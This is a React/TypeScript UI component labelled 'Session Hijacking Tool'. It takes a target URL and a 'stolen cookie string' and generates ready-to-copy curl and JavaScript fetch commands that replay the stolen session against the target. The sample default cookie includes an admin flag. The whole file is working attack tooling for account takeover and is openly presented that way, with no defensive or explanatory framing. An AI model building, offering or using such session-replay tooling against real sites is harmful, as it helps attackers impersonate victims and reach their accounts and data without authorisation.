
'use client';

import { useState } from 'react';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Clipboard, Code, Cookie } from 'lucide-react';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';

const formSchema = z.object({
  url: z.string().url({ message: 'Please enter a valid target URL.' }),
  cookie: z.string().min(1, 'Cookie string cannot be empty.'),
});

type GeneratedCommands = {
    curl: string;
    fetch: string;
}

export function SessionHijackingTool() {
  const [commands, setCommands] = useState<GeneratedCommands | null>(null);
  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      url: 'https://example.com/dashboard',
      cookie: 'sessionid=abc123xyz; user_id=12345; is_admin=true',
    },
  });

  function onSubmit(values: z.infer<typeof formSchema>) {
    setCommands({
        curl: `curl '${values.url}' -H 'Cookie: ${values.cookie}'`,
        fetch: `fetch('${values.url}', {
    headers: {
        'Cookie': '${values.cookie}'
    }
});`
    });
  }

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: 'Copied!', description: 'Command copied to clipboard.' });
  };

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-3">
          <Cookie className="h-6 w-6" />
          <CardTitle>Session Hijacking Tool</CardTitle>
        </div>
        <CardDescription>
          Generate replay commands from stolen session cookies.
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-4">
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <FormField
              control={form.control}
              name="url"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Target URL</FormLabel>
                  <FormControl>
                    <Input placeholder="https://example.com/admin" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
             <FormField
              control={form.control}
              name="cookie"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Stolen Cookie String</FormLabel>
                  <FormControl>
                    <Input placeholder="sessionid=...; other_cookie=..." {...field} className="font-mono"/>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <Button type="submit">
              <Code className="mr-2 h-4 w-4" />
              Generate Replay Commands
            </Button>
          </form>
        </Form>
        
        {commands && (
            <div className="grid md:grid-cols-2 gap-6 pt-4">
                <div className="space-y-2">
                    <Label>cURL Command</Label>
                    <div className="relative">
                        <Textarea readOnly value={commands.curl} className="font-mono h-24 bg-primary/20 pr-10" />
                        <Button variant="ghost" size="icon" className="absolute top-1 right-1 h-7 w-7" onClick={() => handleCopy(commands.curl)}>
                            <Clipboard className="h-4 w-4" />
                        </Button>
                    </div>
                </div>
                 <div className="space-y-2">
                    <Label>JavaScript Fetch Command</Label>
                    <div className="relative">
                        <Textarea readOnly value={commands.fetch} className="font-mono h-24 bg-primary/20 pr-10" />
                        <Button variant="ghost" size="icon" className="absolute top-1 right-1 h-7 w-7" onClick={() => handleCopy(commands.fetch)}>
                            <Clipboard className="h-4 w-4" />
                        </Button>
                    </div>
                </div>
            </div>
        )}

      </CardContent>
    </Card>
  );
}
